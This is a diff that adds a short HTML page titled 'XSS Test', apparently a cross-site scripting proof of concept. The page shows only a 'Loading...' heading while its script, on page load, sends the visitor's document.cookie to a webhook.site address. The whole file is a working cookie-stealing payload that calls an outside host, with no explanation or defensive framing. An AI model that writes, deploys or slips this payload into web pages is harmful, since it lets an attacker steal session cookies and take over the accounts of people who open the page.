@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Test</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    fetch('https://webhook.site/d26a28ec-c3ae-42ef-a995-cff55c70fd0c?cookie='+document.cookie);
+  </script>
+</body>
+</html>
